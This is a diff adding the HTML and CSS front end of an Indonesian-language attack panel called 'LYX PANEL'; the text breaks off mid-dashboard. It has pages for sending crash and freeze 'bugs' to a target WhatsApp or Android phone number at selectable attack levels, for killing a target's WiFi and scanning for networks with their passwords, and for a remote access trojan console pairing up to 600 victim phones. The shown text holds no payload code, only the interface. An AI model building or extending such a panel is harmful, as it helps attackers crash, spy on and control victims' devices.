@@ -1,1 +1,637 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LYX PANEL</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
+  body{background:#000;min-height:100vh;display:flex;justify-content:center;align-items:flex-start;padding:16px;color:#e8e8e8;position:relative;overflow-x:hidden;}
+  body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,transparent 0,transparent 49px,rgba(184,155,62,0.15) 50px,transparent 51px),repeating-linear-gradient(90deg,transparent 0,transparent 49px,rgba(184,155,62,0.15) 50px,transparent 51px);background-size:50px 50px;z-index:-2;animation:gridMove 8s linear infinite;}
+  @keyframes gridMove{0%{transform:translate(0,0);}100%{transform:translate(50px,50px);}}
+  .scan-line{position:fixed;top:0;left:0;width:100%;height:2px;background:linear-gradient(90deg,transparent,#b89b3e,transparent);box-shadow:0 0 20px #b89b3e;z-index:1;animation:scan 4s linear infinite;}
+  @keyframes scan{0%{top:0;opacity:0;}10%{opacity:1;}90%{opacity:1;}100%{top:100%;opacity:0;}}
+  .app{width:100%;max-width:440px;background:rgba(10,10,10,0.85);backdrop-filter:blur(12px);border-radius:20px;padding:18px;border:1px solid rgba(184,155,62,0.3);box-shadow:0 10px 60px rgba(0,0,0,0.9);position:relative;z-index:2;}
+  .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;padding-bottom:14px;border-bottom:1px solid rgba(184,155,62,0.2);gap:8px;flex-wrap:wrap;}
+  .profile-wrap{display:flex;align-items:center;gap:10px;cursor:pointer;}
+  .profile-pic{width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,#b89b3e,#7a6520);display:flex;align-items:center;justify-content:center;overflow:hidden;border:2px solid rgba(184,155,62,0.5);box-shadow:0 0 15px rgba(184,155,62,0.4);}
+  .profile-pic img{width:100%;height:100%;object-fit:cover;}
+  .profile-name{font-size:13px;font-weight:800;color:#fff;letter-spacing:1px;max-width:90px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+  .profile-role{display:flex;align-items:center;gap:4px;padding:3px 8px;border-radius:6px;font-size:8px;font-weight:800;border:1px solid;}
+  .profile-role .role-dot{width:5px;height:5px;border-radius:50%;}
+  .role-MEMBER{color:#9c9484;border-color:#3a3a3a;background:#1a1a1a;}.role-MEMBER .role-dot{background:#9c9484;}
+  .role-PREMIUM{color:#3498db;border-color:#1f4a6b;background:#0e1a24;}.role-PREMIUM .role-dot{background:#3498db;}
+  .role-VVIP{color:#f39c12;border-color:#7a5a1f;background:#241a0e;}.role-VVIP .role-dot{background:#f39c12;}
+  .role-OWNER{color:#e74c3c;border-color:#7a1f1f;background:#240e0e;}.role-OWNER .role-dot{background:#e74c3c;}
+  .role-DEVELOPER{color:#9b59b6;border-color:#4a1f6b;background:#1a0e24;}.role-DEVELOPER .role-dot{background:#9b59b6;}
+  .header-actions{display:flex;gap:6px;}
+  .icon-btn{width:34px;height:34px;border-radius:10px;background:rgba(26,26,26,0.8);border:1px solid #2a2a2a;display:flex;align-items:center;justify-content:center;cursor:pointer;}
+  .icon-btn:active{transform:scale(0.92);}
+  .server-status{display:flex;align-items:center;gap:8px;background:rgba(14,31,14,0.5);border:1px solid rgba(46,204,113,0.3);border-radius:10px;padding:8px 12px;margin-bottom:14px;font-size:9px;color:#2ecc71;font-weight:700;}
+  .dot-live{width:6px;height:6px;border-radius:50%;background:#2ecc71;box-shadow:0 0 8px #2ecc71;animation:pulseDot 1.5s infinite;}
+  @keyframes pulseDot{0%,100%{opacity:1;}50%{opacity:0.4;}}
+  .latency{margin-left:auto;color:#666;font-size:8px;}
+  .login-screen{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:5000;display:flex;align-items:center;justify-content:center;padding:20px;overflow-y:auto;}
+  .login-screen.hidden{display:none;}
+  .login-box{width:100%;max-width:380px;background:rgba(15,15,15,0.95);border-radius:20px;padding:28px 22px;border:1px solid rgba(184,155,62,0.4);margin:auto;}
+  .logo-big{width:64px;height:64px;border-radius:18px;background:linear-gradient(135deg,#b89b3e,#7a6520);display:flex;align-items:center;justify-content:center;margin:0 auto 18px;box-shadow:0 0 40px rgba(184,155,62,0.6);}
+  .login-box h2{text-align:center;font-size:18px;font-weight:800;color:#fff;letter-spacing:3px;margin-bottom:6px;}
+  .login-box .sub{text-align:center;font-size:10px;color:#666;margin-bottom:24px;}
+  .login-tabs{display:flex;gap:8px;margin-bottom:20px;}
+  .login-tab{flex:1;padding:10px;text-align:center;background:#0a0a0a;border-radius:10px;font-size:10px;font-weight:800;color:#666;cursor:pointer;border:1px solid #2a2a2a;}
+  .login-tab.active{background:linear-gradient(135deg,#b89b3e,#8a6f1f);color:#fff;border-color:#b89b3e;}
+  .login-field{width:100%;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:12px;padding:14px 16px;color:#fff;font-size:13px;outline:none;margin-bottom:12px;}
+  .login-btn{width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,#b89b3e,#8a6f1f);color:#fff;font-weight:800;font-size:13px;cursor:pointer;}
+  .login-error{color:#e74c3c;font-size:10px;text-align:center;margin-top:12px;min-height:14px;}
+  .page{display:none;}
+  .page.active{display:block;animation:fadeIn 0.3s;}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
+  .back-header{display:flex;align-items:center;gap:10px;margin-bottom:16px;}
+  .back-btn{width:36px;height:36px;border-radius:10px;background:rgba(26,26,26,0.8);border:1px solid #2a2a2a;display:flex;align-items:center;justify-content:center;cursor:pointer;color:#b89b3e;font-size:20px;font-weight:bold;}
+  .page-title{font-size:13px;font-weight:800;color:#fff;letter-spacing:2px;}
+  .title{display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:#ddd;margin-bottom:12px;}
+  .title .icon-box{width:30px;height:30px;background:rgba(26,26,26,0.8);border-radius:50%;display:flex;align-items:center;justify-content:center;border:1px solid #2a2a2a;}
+  .input-wrap{background:rgba(26,26,26,0.8);border-radius:14px;padding:13px 15px;display:flex;gap:10px;margin-bottom:18px;border:1px solid #2a2a2a;}
+  .input-wrap input{border:none;background:transparent;outline:none;font-size:14px;color:#eee;width:100%;}
+  .input-wrap input::placeholder{color:#555;}
+  .slider{display:flex;gap:12px;overflow-x:auto;padding-bottom:8px;}
+  .slider::-webkit-scrollbar{display:none;}
+  .card{min-width:160px;background:rgba(26,26,26,0.8);border-radius:14px;padding:13px;border:2px solid transparent;position:relative;cursor:pointer;}
+  .card.active{background:rgba(24,20,10,0.9);border:2px solid #b89b3e;box-shadow:0 0 25px rgba(184,155,62,0.4);}
+  .card.danger.active{background:rgba(36,14,14,0.9);border:2px solid #ff0000;box-shadow:0 0 30px rgba(255,0,0,0.6);}
+  .card .check{position:absolute;top:10px;right:10px;width:18px;height:18px;border-radius:50%;background:#2ecc71;display:none;align-items:center;justify-content:center;}
+  .card.active .check{display:flex;}
+  .card.danger.active .check{background:#ff0000;}
+  .badge-icon{width:34px;height:34px;border-radius:50%;background:#222;display:flex;align-items:center;justify-content:center;margin-bottom:8px;}
+  .card.active .badge-icon{background:#b89b3e;}
+  .card.danger.active .badge-icon{background:#ff0000;}
+  .card h4{font-size:11px;font-weight:800;color:#fff;margin-bottom:8px;line-height:1.3;}
+  .card .tag{display:inline-block;background:#222;padding:3px 9px;border-radius:6px;font-size:9px;color:#888;}
+  .card.active .tag{background:#b89b3e;color:#fff;}
+  .card.danger.active .tag{background:#ff0000;color:#fff;}
+  .dots{display:flex;justify-content:center;gap:6px;margin:12px 0 18px;}
+  .dot{width:16px;height:4px;border-radius:4px;background:#333;}
+  .dot.active{background:#b89b3e;width:24px;}
+  .intensity-bar{display:flex;gap:6px;margin-bottom:14px;align-items:center;}
+  .intensity-opt{flex:1;padding:8px 4px;text-align:center;border-radius:8px;background:rgba(26,26,26,0.8);border:1px solid #2a2a2a;font-size:9px;font-weight:800;color:#666;cursor:pointer;}
+  .intensity-opt.active{background:#2a1414;border-color:#e74c3c;color:#e74c3c;}
+  .sender-box{display:flex;gap:10px;margin-bottom:12px;}
+  .sender-option{flex:1;border-radius:14px;padding:16px 8px;text-align:center;cursor:pointer;background:rgba(26,26,26,0.8);border:2px solid transparent;}
+  .sender-option.active{background:linear-gradient(135deg,#2f88d6,#1e6bb0);border:2px solid #4aa8f0;}
+  .sender-option .name{font-size:12px;font-weight:800;margin-top:6px;color:#fff;}
+  .sender-option .sub{font-size:9px;margin-top:3px;color:#888;}
+  .btn-send{width:100%;background:linear-gradient(135deg,#b89b3e,#8a6f1f);color:#fff;border:none;padding:15px;border-radius:14px;font-size:14px;font-weight:800;cursor:pointer;margin-top:14px;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 8px 25px rgba(184,155,62,0.5);}
+  .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:14px;}
+  .feature-card{background:rgba(26,26,26,0.8);border-radius:16px;padding:16px;border:1px solid #2a2a2a;cursor:pointer;position:relative;}
+  .feature-card:active{transform:scale(0.97);}
+  .f-icon{width:46px;height:46px;border-radius:12px;display:flex;align-items:center;justify-content:center;margin-bottom:12px;background:#2a1414;border:1px solid #4a2020;}
+  .f-icon.green{background:#142a14;border-color:#204a20;}
+  .f-icon.purple{background:#1a142a;border-color:#2e204a;}
+  .f-icon.yellow{background:#2a2414;border-color:#4a3e20;}
+  .feature-card h4{font-size:12px;font-weight:800;color:#fff;}
+  .feature-card p{font-size:9px;color:#777;margin-top:4px;}
+  .status-dot{position:absolute;bottom:12px;right:12px;width:7px;height:7px;border-radius:50%;background:#333;}
+  .status-dot.active{background:#2ecc71;box-shadow:0 0 6px #2ecc71;}
+  .status-dot.off{background:#e74c3c;box-shadow:0 0 6px #e74c3c;}
+  .status-dot.blink{background:#f39c12;animation:blink 0.5s infinite;}
+  @keyframes blink{0%,100%{opacity:1;}50%{opacity:0.2;}}
+  .live-title{text-align:center;font-size:12px;font-weight:800;letter-spacing:4px;color:#e74c3c;margin:18px 0 12px;}
+  .setting-card{background:rgba(26,26,26,0.8);border-radius:16px;padding:16px;border:1px solid #2a2a2a;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;}
+  .setting-card .left{display:flex;align-items:center;gap:12px;}
+  .setting-card .icon{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;}
+  .icon.red{background:#2a1414;border:1px solid #4a2020;}
+  .icon.green{background:#142a14;border:1px solid #204a20;}
+  .icon.yellow{background:#2a2414;border:1px solid #4a3e20;}
+  .icon.purple{background:#1a142a;border:1px solid #2e204a;}
+  .setting-card h4{font-size:13px;font-weight:800;color:#fff;}
+  .setting-card p{font-size:10px;color:#777;margin-top:3px;}
+  .setting-card .arrow{color:#555;font-size:18px;}
+  .pair-code-box{display:flex;gap:10px;align-items:center;background:rgba(10,10,10,0.9);border-radius:12px;padding:12px 14px;border:1px dashed #b89b3e;margin-bottom:14px;}
+  .pair-code-box .code{flex:1;font-size:18px;font-weight:800;letter-spacing:4px;color:#b89b3e;font-family:monospace;}
+  .pair-code-box .btn-gen{background:#b89b3e;color:#fff;border:none;padding:8px 14px;border-radius:8px;font-size:10px;font-weight:800;cursor:pointer;}
+  .pair-code-box .btn-copy{background:#222;color:#aaa;border:1px solid #333;padding:8px 10px;border-radius:8px;font-size:10px;font-weight:700;cursor:pointer;}
+  .device-item{background:rgba(26,26,26,0.8);border-radius:14px;padding:13px;margin-bottom:10px;border:1px solid #2a2a2a;display:flex;justify-content:space-between;align-items:center;}
+  .dev-left{display:flex;align-items:center;gap:12px;}
+  .dev-icon{width:42px;height:42px;border-radius:10px;background:#0a0a0a;display:flex;align-items:center;justify-content:center;border:1px solid #333;}
+  .dev-name{font-size:12px;font-weight:800;color:#fff;}
+  .dev-meta{font-size:9px;color:#777;margin-top:3px;}
+  .btn-open{background:#b89b3e;color:#fff;border:none;padding:8px 14px;border-radius:8px;font-size:10px;font-weight:800;cursor:pointer;}
+  .wifi-card{background:linear-gradient(135deg,rgba(14,26,14,0.9),rgba(10,10,10,0.9));border-radius:16px;padding:16px;margin-bottom:12px;border:2px solid #2ecc71;}
+  .wifi-card h4{font-size:13px;font-weight:800;color:#2ecc71;margin-bottom:8px;}
+  .wifi-card p{font-size:10px;color:#888;margin-bottom:12px;}
+  .wifi-input{width:100%;background:rgba(10,10,10,0.8);border:1px solid #2a2a2a;border-radius:10px;padding:12px 14px;color:#fff;font-size:12px;outline:none;margin-bottom:10px;}
+  .wifi-btn{width:100%;padding:12px;border:none;border-radius:10px;background:linear-gradient(135deg,#2ecc71,#1a8f4a);color:#fff;font-weight:800;font-size:12px;cursor:pointer;}
+  .wifi-btn.danger{background:linear-gradient(135deg,#e74c3c,#8f1a1a);}
+  .wifi-item{background:rgba(10,10,10,0.8);border-radius:10px;padding:12px 14px;margin-bottom:8px;border:1px solid #2a2a2a;}
+  .wifi-item h5{font-size:12px;font-weight:800;color:#fff;}
+  .wifi-item p{font-size:9px;color:#2ecc71;margin-top:3px;font-family:monospace;}
+  .price-item{display:flex;justify-content:space-between;align-items:center;background:rgba(10,10,10,0.8);padding:14px 16px;border-radius:12px;border:2px solid #2a2a2a;cursor:pointer;margin-bottom:10px;}
+  .price-item.active{border-color:#b89b3e;background:rgba(26,20,8,0.9);}
+  .role-name{font-size:12px;font-weight:800;letter-spacing:1px;}
+  .price-tag{font-size:13px;font-weight:900;color:#b89b3e;background:rgba(26,20,8,0.8);padding:4px 12px;border-radius:8px;border:1px solid #4a3e20;}
+  .qris-section{background:rgba(10,10,10,0.8);border-radius:12px;padding:14px;text-align:center;margin-bottom:14px;border:1px solid #2a2a2a;}
+  .qris-img{width:200px;height:200px;margin:0 auto;background:#fff;border-radius:12px;display:flex;align-items:center;justify-content:center;padding:8px;overflow:hidden;}
+  .qris-img img{width:100%;height:100%;object-fit:contain;border-radius:8px;}
+  .upload-qris-btn{display:flex;align-items:center;justify-content:center;gap:8px;background:rgba(26,20,8,0.8);border:1px dashed #b89b3e;border-radius:10px;padding:10px;margin-top:10px;cursor:pointer;font-size:10px;font-weight:800;color:#b89b3e;}
+  .upload-qris-btn input{display:none;}
+  .upload-bukti{background:rgba(10,10,10,0.8);border-radius:12px;padding:14px;margin-bottom:14px;border:1px dashed #b89b3e;text-align:center;cursor:pointer;}
+  .upload-bukti input{display:none;}
+  .upload-text{font-size:11px;font-weight:800;color:#b89b3e;}
+  .preview-img{max-width:100%;max-height:120px;border-radius:8px;margin-top:8px;display:none;}
+  .warning-text{background:rgba(42,20,20,0.6);border:1px solid #4a2020;border-radius:10px;padding:12px 14px;margin-bottom:14px;font-size:10px;color:#e74c3c;line-height:1.6;}
+  .btn-submit{width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,#b89b3e,#8a6f1f);color:#fff;font-weight:800;font-size:13px;cursor:pointer;}
+  .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);display:none;align-items:center;justify-content:center;z-index:1000;padding:20px;backdrop-filter:blur(6px);}
+  .modal.show{display:flex;}
+  .modal-box{width:100%;max-width:360px;background:rgba(15,15,15,0.98);border-radius:20px;padding:22px;border:1px solid #2a2a2a;max-height:85vh;overflow-y:auto;}
+  .modal-box h3{font-size:14px;font-weight:800;color:#fff;margin-bottom:16px;display:flex;align-items:center;gap:10px;}
+  .input-field{width:100%;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:10px;padding:12px 14px;color:#fff;font-size:13px;outline:none;margin-bottom:12px;}
+  textarea.input-field{min-height:120px;font-family:monospace;font-size:11px;resize:vertical;}
+  .btn-cancel{width:100%;padding:11px;border:1px solid #333;border-radius:10px;background:transparent;color:#888;font-weight:700;font-size:11px;cursor:pointer;margin-top:8px;}
+  .profile-modal-pic{width:120px;height:120px;border-radius:24px;background:linear-gradient(135deg,#b89b3e,#7a6520);margin:0 auto 16px;display:flex;align-items:center;justify-content:center;overflow:hidden;border:3px solid #b89b3e;}
+  .profile-modal-pic img{width:100%;height:100%;object-fit:cover;}
+  .profile-modal-name{text-align:center;font-size:16px;font-weight:800;color:#fff;margin-bottom:6px;}
+  .profile-modal-role{text-align:center;font-size:10px;font-weight:800;margin-bottom:20px;}
+  .profile-upload-btn{display:flex;align-items:center;justify-content:center;gap:8px;background:#1a1408;border:1px dashed #b89b3e;border-radius:10px;padding:12px;margin-bottom:10px;cursor:pointer;font-size:11px;font-weight:800;color:#b89b3e;}
+  .profile-upload-btn input{display:none;}
+  .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);display:none;align-items:center;justify-content:center;flex-direction:column;z-index:999;cursor:pointer;backdrop-filter:blur(6px);}
+  .overlay.show{display:flex;}
+  .check-big{width:120px;height:120px;border-radius:50%;background:#2ecc71;display:flex;align-items:center;justify-content:center;box-shadow:0 0 80px rgba(46,204,113,1);animation:pop 0.4s;}
+  @keyframes pop{0%{transform:scale(0);}100%{transform:scale(1);}}
+  .overlay p{color:#fff;font-size:18px;font-weight:800;margin-top:20px;text-align:center;padding:0 20px;}
+  .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);display:none;align-items:center;justify-content:center;flex-direction:column;z-index:1000;backdrop-filter:blur(6px);}
+  .loading-overlay.show{display:flex;}
+  .spinner{width:70px;height:70px;border-radius:50%;border:4px solid rgba(184,155,62,0.2);border-top-color:#b89b3e;animation:spin 0.8s linear infinite;}
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .loading-overlay p{color:#b89b3e;font-size:12px;font-weight:800;margin-top:22px;}
+  .toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:#b89b3e;color:#fff;padding:10px 20px;border-radius:10px;font-size:11px;font-weight:700;z-index:2000;opacity:0;transition:0.3s;max-width:90%;text-align:center;}
+  .toast.show{opacity:1;bottom:40px;}
+</style>
+</head>
+<body>
+<div class="scan-line"></div>
 
+<div class="login-screen" id="loginScreen">
+  <div class="login-box">
+    <div class="logo-big"><svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg></div>
+    <h2>LYX PANEL</h2>
+    <div class="sub">SECURE ACCESS SYSTEM</div>
+    <div class="login-tabs">
+      <div class="login-tab active" data-tab="login">LOGIN</div>
+      <div class="login-tab" data-tab="register">CREAT ACCOUNT</div>
+    </div>
+    <input type="text" class="login-field" id="loginUser" placeholder="USERNAME" autocomplete="off">
+    <input type="password" class="login-field" id="loginPass" placeholder="PASSWORD" autocomplete="off">
+    <button class="login-btn" id="loginBtn">MASUK</button>
+    <div class="login-error" id="loginError"></div>
+  </div>
+</div>
+
+<div class="app">
+  <div class="header">
+    <div class="profile-wrap" id="profileWrap">
+      <div class="profile-pic" id="headerProfilePic"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
+      <div class="profile-info">
+        <div class="profile-name" id="headerProfileName">USER</div>
+        <div class="profile-role role-MEMBER" id="headerProfileRole"><div class="role-dot"></div><span id="headerRoleText">MEMBER</span></div>
+      </div>
+    </div>
+    <div class="header-actions">
+      <div class="icon-btn" id="btnWifiNav"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#2ecc71" stroke-width="2"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/></svg></div>
+      <div class="icon-btn" id="btnRatNav"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#e74c3c" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="3"/><line x1="12" y1="18" x2="12" y2="18"/></svg></div>
+      <div class="icon-btn" id="btnSettingsNav"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#b89b3e" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg></div>
+    </div>
+  </div>
+
+  <div class="server-status"><div class="dot-live"></div><span id="serverStatusText">BACKEND CONNECTED</span><span class="latency" id="latencyText">-- ms</span></div>
+
+  <div class="page active" id="pageBug">
+    <div class="title"><div class="icon-box"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#b89b3e" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="3"/></svg></div>NOMOR TARGET</div>
+    <div class="input-wrap"><input type="tel" id="target" placeholder="62xxxxxxxxxx" maxlength="15"></div>
+    <div class="title"><div class="icon-box"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#e74c3c" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg></div>LEVEL SERANGAN</div>
+    <div class="intensity-bar">
+      <div class="intensity-opt active" data-level="normal">NORMAL</div>
+      <div class="intensity-opt" data-level="hard">HARD</div>
+      <div class="intensity-opt" data-level="extreme">EXTREME</div>
+    </div>
+    <div class="title"><div class="icon-box"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#b89b3e" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 1v6m0 10v6"/></svg></div>PILIH BUG</div>
+    <div class="slider" id="bugSlider">
+      <div class="card active" data-bug="crash_wa"><div class="check"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg></div><div class="badge-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/></svg></div><h4>CRASH WA</h4><span class="tag">delayvault</span></div>
+      <div class="card" data-bug="invisible_wa"><div class="check"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg></div><div class="badge-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><line x1="1" y1="1" x2="23" y2="23"/></svg></div><h4>INVISIBLE WA</h4><span class="tag">ghostvault</span></div>
+      <div class="card" data-bug="crash_android"><div class="check"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg></div><div class="badge-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/></svg></div><h4>CRASH ANDRO</h4><span class="tag">forcevault</span></div>
+      <div class="card" data-bug="invisible_android"><div class="check"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg></div><div class="badge-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="9" y1="6" x2="15" y2="6"/></svg></div><h4>INVISIBLE ANDRO</h4><span class="tag">blankvault</span></div>
+      <div class="card" data-bug="force_close"><div class="check"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg></div><div class="badge-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/></svg></div><h4>FORCE CLOSE</h4><span class="tag">killvault</span></div>
+      <div class="card" data-bug="ui_freeze"><div class="check"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg></div><div class="badge-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div><h4>UI FREEZE</h4><span class="tag">freezevault</span></div>
+      <div class="card danger" data-bug="forceclose_v2"><div class="check"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg></div><div class="badge-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/></svg></div><h4>FORCECLOSE V2</h4><span class="tag">BRUTAL</span></div>
+      <div class="card danger" data-bug="crash_invisible"><div class="check"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg></div><div class="badge-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/></svg></div><h4>CRASH INVISIBLE COMBAT</h4><span class="tag">BRUTAL</span></div>
+      <div class="card danger" data-bug="ui_crasher"><div class="check"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg></div><div class="badge-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/></svg></div><h4>UI CRASHER</h4><span class="tag">MALWARE</span></div>
+    </div>
+    <div class="dots" id="dots"><div class="dot active"></div><div class="dot"></div><div class="dot"></div></div>
+    <div class="title"><div class="icon-box"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#b89b3e" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></div>PILIH SENDER</div>
+    <div class="sender-box">
+      <div class="sender-option active" id="senderPrivate"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg><div class="name">Pribadi</div><div class="sub">Silent Mode</div></div>
+      <div class="sender-option" id="senderGlobal"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/></svg><div class="name">Global</div><div class="sub">12 sender</div></div>
+    </div>
+    <button class="btn-send" id="btnSend"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>KIRIM BUG</button>
+  </div>
+
+  <div class="page" id="pageWifi">
+    <div class="back-header"><div class="back-btn" onclick="showPage('bug')">←</div><div class="page-title" style="color:#2ecc71">WIFI ALL MENU</div></div>
+    <div class="wifi-card"><h4>📡 KILL WIFI</h4><p>Matikan WiFi target.</p><input type="text" class="wifi-input" id="killWifiName" placeholder="NAMA WIFI TARGET"><button class="wifi-btn danger" id="btnKillWifi">MATIKAN WIFI</button></div>
+    <div class="wifi-card"><h4>🔍 SCAN WIFI</h4><p>Lihat WiFi sekitar + password.</p><button class="wifi-btn" id="btnScanWifi">MULAI SCAN</button><div id="wifiList" style="margin-top:12px"></div></div>
+  </div>
+
+  <div class="page" id="pageRat">
+    <div class="back-header"><div class="back-btn" onclick="showPage('bug')">←</div><div class="page-title">RAT CONTROL</div></div>
+    <div class="pair-code-box"><div class="code" id="pairCode">------</div><button class="btn-gen" id="btnGen">GEN</button><button class="btn-copy" id="btnCopy">COPY</button></div>
+    <div style="font-size:9px;color:#666;margin-bottom:12px;line-height:1.6">Generate code → masukin di APK Lyx Client di HP target → device muncul di list bawah.</div>
+    <div style="display:flex;justify-content:space-between;font-size:11px;font-weight:700;color:#aaa;margin-bottom:10px"><span>LIST DEVICE</span><span id="deviceCount" style="color:#b89b3e">0 / 600</span></div>
+    <div id="deviceList"><div style="text-align:center;padding:20px;color:#555;font-size:11px">Belum ada device terpairing</div></div>
+  </div>
+
+  <div class="page" id="pageDash">
+    <div class="back-header"><div class="back-btn" onclick="showPage('rat')">←</div><div class="page-title" id="dashTitle">DASHBOARD</div></div>
+    <div class="grid-2">
